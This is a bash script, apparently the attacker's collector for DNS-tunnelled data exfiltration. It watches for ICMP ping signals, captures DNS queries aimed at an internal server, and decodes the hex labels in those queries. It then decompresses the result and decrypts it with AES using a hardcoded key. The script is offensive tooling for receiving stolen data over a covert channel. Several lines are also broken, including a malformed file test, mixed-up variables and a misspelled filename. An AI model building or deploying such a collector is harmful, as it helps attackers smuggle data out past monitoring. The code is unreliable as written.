#!/bin/bash

file="/root/xfil/ping.out"
svr=192.168.181.173


listen_for_signal()
{
  tcpdump -i eth0 'icmp[icmptype] = icmp-echo' -l |tee $file
  



}

start_catch()
{
  pkill tcpdump ## kill the tcpdump for the command signal
  tcpdump -vvv -s 0 -l -n port 53 > xfil.tcpdump
  echo waiting for dns xfil
  sleep 60
  fsize=$(du -sb xfil.tcpdump | awk '{ print $1 }')
  if [ $fsize > "0" ]; then
    echo caught exfil request
    pkill tcpdump
    parse_signal $1
  fi
}

stop_catch()
{
  pkill tcpdump ## stop the catch
  listen_for_signal  ## start a new command signal listenter
}


parse_signal()
{
  if [ -file ]; then
    awk '/86|66|96/' $file > $file.awk
    fsize=$(du -sb $file.awk | awk '{ print $1 }')
    if [ $fsize > "0" ]; then
     echo "Caught DNS xfil request"
     echo "Initiating catch.sh..."
     start_catch
    fi

   # cleanup
   rm --interactive=never $file.awk
  fi

}

cleanup()
{
  rm --interactive=never $file.akw
}


parse_data()
{
  egrep -o "[0-9a-f]*.$svr" $c | cut -d. -f1 | grep -v ^\ | uniq >> $1.hex.out
  xxd -r -p $i.hex.out > $1.gz
  tar zxvf $1.gz -O > $1.xpand
  openssl aes-256-cbc -d -in $1.xpand -out $1.final -k 1234
}


###MAIN
#
c=xfil.tcpdump
listen_for_signal
